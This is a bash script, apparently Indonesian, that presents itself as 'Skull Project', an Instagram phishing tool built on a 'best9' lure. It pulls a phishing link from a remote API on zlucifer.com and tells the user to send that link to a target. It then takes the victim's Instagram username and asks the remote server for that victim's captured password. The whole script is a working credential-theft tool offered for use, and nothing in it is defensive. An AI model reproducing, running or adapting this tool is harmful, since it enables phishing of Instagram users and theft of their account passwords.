#!/bin/bash
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
#////                                                                       ////
#////                         BUJANK LAPUK                                  ////
#////                         IKRAM WADUDU                                  ////
#////                                                                       ////
#///////////////////////////////////////////////////////////////////////////////
#///////////////////////////////////////////////////////////////////////////////
intro(){
echo "Selamat datang kak, Siapa nick kaka?" #tulisan keluar
read nick #membaca yang ditulis
echo "            _,.-------.,_ "
sleep 0.03
echo "        ,;~'             '~;, "
sleep 0.03
echo "      ,;                     ;, "
sleep 0.03
echo "     ;                         ; "
sleep 0.03
echo "    ,'                         ', "
sleep 0.03
echo "   ,;                           ;, "
sleep 0.03
echo "   ; ;      .           .      ; ; "
sleep 0.03
echo "   | ;   ______       ______   ; | "
sleep 0.03
echo "   |  '/~'     ~' . '~     '~\'  | "
sleep 0.03
echo "   |  ~  ,-~~~^~, | ,~^~~~-,  ~  | "
sleep 0.03
echo "    |   |        }:{        |   | "
sleep 0.03
echo "    |   l       / | \       !   | "
sleep 0.03
echo "    .~  (__,.--' .^. '--.,__)  ~. "
sleep 0.03
echo "    |     ---;' / | \ ';---     | "
sleep 0.03
echo "     \__.       \/^\/       .__/ "
sleep 0.03
echo "      V| \                 / |V "
sleep 0.03
echo "       | |T~\___!___!___/~T| | "
sleep 0.03
echo "       | |'IIII_I_I_I_IIII'| | "
sleep 0.03
echo "       |  \,III I I I III,/  | "
sleep 0.03
echo "        \   '~~~~~~~~~~'    / "
sleep 0.03
echo "          \   .       .   / "
sleep 0.03
echo "            \.    ^    ./ " 
sleep 0.03
echo "              ^~~~^~~~^  "
sleep 0.03
echo "  ================================"
sleep 2
echo "  ==       5kull Project        =="
sleep 0.7
echo "  ================================"
echo " Skull Project adalah Tools phising "
echo " Instagram via best9 "
echo
echo "Selamat datang "$nick
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
get_url=$(curl -s http://zlucifer.com/api/best9_api_1.php)
get_url2=$(curl -s http://zlucifer.com/api/best9_api_2.php)
cek='curl -s '$get_url2 # check status
ikramwadudu="user-agent: ikram"
clear
echo Mohon tunggu..
load
clear
intro
response=`curl -H "$zlucifer" -m "240" -s -o /dev/null -w "%{http_code}" $cek`
#echo $response
if [[ $response != *200* ]]; then
    echo
    echo "Website Offline/Restart untuk sementara"
else
    echo
    echo
    echo "Cara penggunaan :"
    echo "1. Copy link ini : $get_url2"
    echo "2. Kirim link yang sudah di copy ke target"
    echo "3. Jika korban sudah terkena bisa langsung di cek"
    echo 
    echo "Mau melakukan cek target?"
    echo "y/n?"
    read confirm
    if [ $confirm = "y" ]; then
            echo "Silahkan masukan username Instagram target"
            echo "contoh instagram"
            read target # masukin user instagram
            echo
            echo "Apakah username $target sudah benar?"
            echo y/n?
            read confirm
        echo
        if [ $confirm = "y" ]; then
                echo Melakukan pencarian password username : $target
                load
            echo
            echo
                    echo "Jangan close aplikasi sebelum scan selesai"            
                    echo "========================================"
                cek_target=`curl -s $get_url/instagram.php?cari=$target`
                echo -e $cek_target
            echo "======================================="
                    echo " Jangan Lupa Membayar Pajak"
                    echo " -Ikram"
                    echo "======================================="
            else
                    echo "Kesalahan"
            fi            
    else
                echo "Terimakasih sudah menggunakan 5kull Project"
    fi
fi
